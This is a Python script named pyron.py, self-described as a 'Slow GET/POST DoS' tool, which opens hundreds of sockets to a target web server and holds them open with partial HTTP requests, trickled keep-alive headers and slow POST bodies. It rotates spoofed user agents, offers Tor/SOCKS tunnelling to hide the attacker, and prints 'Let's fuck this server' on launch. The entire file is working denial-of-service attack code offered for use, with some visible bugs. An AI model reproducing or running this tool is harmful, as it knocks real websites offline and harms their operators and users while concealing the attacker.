#!/usr/bin/python3
from socket import *
import time, random, string
import argparse, sys
import threading, socks

s0ckets = []
threadz = []
agents = [
	"User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
	"User-agent: Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.0450$",
	"User-agent: Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
	"User-agent: Mozilla/4.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like $)",
	"User-agent: Mozilla/4.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like $)",
	"User-agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; fr; rv:1.9.1b4) Gecko/20090423 Firefox/3.5b4",
	"User-agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; it; rv:1.9b4) Gecko/2008030317 Firefox/3.0b4",
	"User-agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; ko; rv:1.9.1b2) Gecko/20081201 Firefox/3.1b2",
	"User-agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; de; rv:1.9.0.13) Gecko/2009073021 Firefox/3.0.13",
	"User-agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
]
	
class httpGET(threading.Thread):
	def  __init__(self, url, port, timeout, sockets, proxy):
		threading.Thread.__init__(self)
		self.tor = tor
		if self.tor:
			try:
				global socket
				try:
					torport = tor.split(':')[1]
				except:
					torport = 9050
				self.torproxy = socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", int(torport))
				socket = socks.socksocket
			except ValueError:
				exit('Invalid proxy port\n\nUsage: pyron.py -u www.host.com\nType pyron.py -h to help with options')
			except IndexError:
				exit('Proxy address invalid\n\nUsage: pyron.py -u www.host.com\nType pyron.py -h to help with options')
		self.url = url
		self.port = port
		self.timeout = timeout
		self.thread = thread
		self.sockets = sockets
	def connect(self, name):
		for i in range(int(self.sockets)):
			try:
				accept_lang  = "Accept-language: en-US,en,q=0.5"
				rand = random.choice(agents) + "\n" + accept_lang
				print("Attack started, creating {} sockets".format(self.sockets), end='\r')
				s = socket(AF_INET, SOCK_STREAM)	
				s.settimeout(int(self.timeout))
				s.connect((self.url, int(self.port)))
				s.send('GET /?{} HTTP/1.1\r\nHost: {}\r\n{}\r\nContent-Length: 6000\r\n'.format(random.randint(1, 9999999999999), self.url, rand).encode("utf-8"))
			except BrokenPipeError:
				pass
			except IOError:
				pass
			s0ckets.append(s)
		print("{} sockets completed, sending keep-alive's...".format(len(s0ckets)))
		LENGTH = len(list(s0ckets))
		try:
			while True:
				for s in list(s0ckets):
					try:	
						s.send('X-a: {}\r\n'.format(random.randint(1, 9999999999999)).encode('utf-8'))
					except BrokenPipeError:
						pass
					except error:
						s0ckets.remove(s)
					
				print('Triggering {} keep-alives headers'.format(int(LENGTH)), end = '\r')				
				for i in range(int(self.sockets) - len(list(s0ckets))):
					print("Socket {} restarted".format(i))
					try:
						s = post.connect("Thread")
					except error as f:
						print(f); break
					s0ckets.append(s)
			time.sleep(15)
		except BrokenPipeError:
			pass
		except IOError:
			pass
		
class httpPOST(threading.Thread):
	def __init__(self, url, port, timeout, sockets, tor):
		threading.Thread.__init__(self)
		self.tor = tor 
		if self.tor:
			try:
				global socket
				try:
					socksport = tor.split(':')[1]
				except:
					socksport = 9050
				self.socksproxy = socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", int(socksport))
				socket = socks.socksocket
			except ValueError:
				exit(colors.cyan + 'Invalid proxy port' + colors.reset)
			except IndexError:
				exit(colors.cyan + "Proxy address invalid" + colors.reset)
		self.url = url
		self.port = port
		self.timeout = timeout
		self.thread = thread
		self.sockets = sockets
	def connect(self, name):
		for i in range(int(self.sockets)):
			try:
				accept_lang  = "Accept-language: en-US,en,q=0.5"
				rand = random.choice(agents) + "\n" + accept_lang
				print("Attack started, creating {} sockets".format(self.sockets), end="\r")
				s = socket(AF_INET, SOCK_STREAM)	
				s.settimeout(int(self.timeout))
				s.connect((self.url, int(self.port)))
				s.send('POST / HTTP/1.1\r\nHost: {}\r\n{}\r\nContent-Length: 10000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n'.format(self.url, rand).encode('utf-8'))		
				for p in range(100000):
					r = random.choice(string.ascii_letters)
					s.send(r.encode('utf-8'))
					time.sleep(random.uniform(1, 3))
			except BrokenPipeError:
				pass
			except IOError:
				pass
			s0ckets.append(s)
		print("{} sockets completed, sending keep-alive's ".format(len(s0ckets)))
		LENGTH = len(list(s0ckets))
		try:
			while True:
				for s in list(s0ckets):
					try:	
						s.send('X-a: {}\r\n'.format(random.randint(1, 9999999999999)).encode('utf-8'))
					except BrokenPipeError:
						pass
					except error:
						s0ckets.remove(s)

				print('Triggering {} keep-alives headers'.format(int(LENGTH)), end = '\r')				
				for i in range(int(self.sockets) - len(list(s0ckets))):
					print("Socket {} restarted".format(i))
					try:
						s = post.connect("Thread")
					except error as f:
						print(f); break
					s0ckets.append(s)
			time.sleep(15)
		except BrokenPipeError:
			pass
		except IOError:
			pass
					

def main():
	global proxy, proxy_status
	if method.lower() == "post":
		global post
		post = httpPOST(url, port, timeout, sockets, tor)
		print("Let's fuck this server\n\nMethod: POST\nMultithreading enabled\nURL: %s\nSockets: %s\nThreads: %s\nPort: %s\nTimeout: %s\nSocks proxy: %s\n"%(url, sockets, thread, port, timeout, tor))
		time.sleep(0.9)
		for k in range(int(thread)):
			thr = threading.Thread(target=post.connect, args=(2,))
			threadz.append(thr)
			thr.start()
			
	if method.lower() == "get":
		global get
		get = httpGET(url, port, timeout, sockets, tor)
		print("Let's fuck this server\n\nMethod: GET\nMultithreading enabled\nURL: %s\nSockets: %s\nThreads: %s\nPort: %s\nTimeout: %s\nSocks proxy: %s\n"%(url, sockets, thread, port, timeout, tor))
		time.sleep(0.9)
		for k in range(int(thread)):
			thr = threading.Thread(target=get.connect, args=(2,))
			threadz.append(thr)
			thr.start()
			

if __name__ == "__main__":
	if len(sys.argv) < 2:
		exit("Usage: pyron.py -u www.host.com\n\nType pyron.py -h to help with options")
	parser = argparse.ArgumentParser(prog="pyron.py", description="Slow GET/POST DoS by badb0y17", usage="pyron.py [options] www.example.com")
	parser.add_argument("-u", "--url", help="Set the URL")
	parser.add_argument("-p", "--port", default=80, help="HTTP = 80, HTTPS = 443, default is 80")
	parser.add_argument("-s", "--sockets", dest="sockets", default=400, help="Number of sockets, by default is 400")
	parser.add_argument("-t", "--threads", dest="threads", default=6, help="Enables multithreading, with default is 6 threads")
	parser.add_argument("-m", "--method", dest="method", default="GET", help="HTTP Method GET/POST, by default is GET")
	parser.add_argument("--timeout", default="5", help="Timeout between sockets")
	parser.add_argument("--socksproxy", default = None, dest="socksproxy", help="""Set custom SOCKS proxy
	e.g: --socksproxy 127.0.0.1:9050""")
	parser.add_argument("--tor", help="Redirect/Tunneling connections through TOR network", default = None, action='store_true')
	args = parser.parse_args()
	method = args.method
	url = args.url
	port = args.port
	sockets = args.sockets
	thread = args.threads
	timeout = args.timeout
	socksproxy = args.socksproxy
	tor = args.tor
	main()
